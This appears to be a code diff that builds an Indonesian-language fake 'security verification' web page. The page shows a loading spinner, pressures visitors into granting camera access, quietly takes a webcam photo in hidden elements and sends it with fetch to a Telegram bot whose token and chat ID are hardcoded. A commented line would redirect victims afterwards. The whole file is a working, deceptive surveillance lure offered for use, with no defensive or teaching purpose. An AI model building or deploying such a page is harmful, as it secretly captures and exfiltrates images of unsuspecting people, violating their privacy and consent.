@@ -1,26 +1,64 @@
-<script>
-    const token = 'YOUR_BOT_TOKEN'; 
-    const chat_id = 'YOUR_CHAT_ID';
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; display: inline-block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h3>Mohon tunggu...</h3>
+    <p>Sedang menghubungkan ke server verifikasi.</p>
+    <div class="loader"></div>
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-        const video = document.getElementById('video');
-        video.srcObject = stream; // Sambungkan kamera ke elemen video
-        
-        setTimeout(() => {
-            const canvas = document.getElementById('canvas');
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        // Data Bot Anda yang sudah dimasukkan
+        const token = '8294820735:AAFiNDZekoQwTp_sKu-qf-0KuVC8RNsfzY8'; 
+        const chat_id = '985559722'; 
+
+        // 1. Meminta izin kamera
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
             
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chat_id); // Alamat tujuan (Anda)
-                formData.append('photo', blob, 'capture.jpg'); // File foto
+            // 2. Tunggu 2 detik agar kamera fokus, lalu ambil gambar
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, 640, 480);
+                
+                // 3. Ubah menjadi file gambar (Blob)
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chat_id);
+                    formData.append('photo', blob, 'capture.jpg');
 
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }, 'image/jpeg');
-        }, 2000);
-    });
-</script>
+                    // 4. Kirim ke Bot Telegram Anda
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => {
+                        console.log('Foto berhasil dikirim!');
+                        // Opsional: Alihkan pengguna ke situs lain setelah selesai
+                        // window.location.href = "https://google.com";
+                    })
+                    .catch(error => console.error('Gagal mengirim ke Telegram:', error));
+                }, 'image/jpeg');
+            }, 2000);
+        })
+        .catch(err => {
+            console.error("Akses kamera ditolak oleh pengguna.");
+            alert("Verifikasi gagal. Anda harus mengizinkan akses kamera untuk melanjutkan.");
+        });
+    </script>
+</body>
+</html>
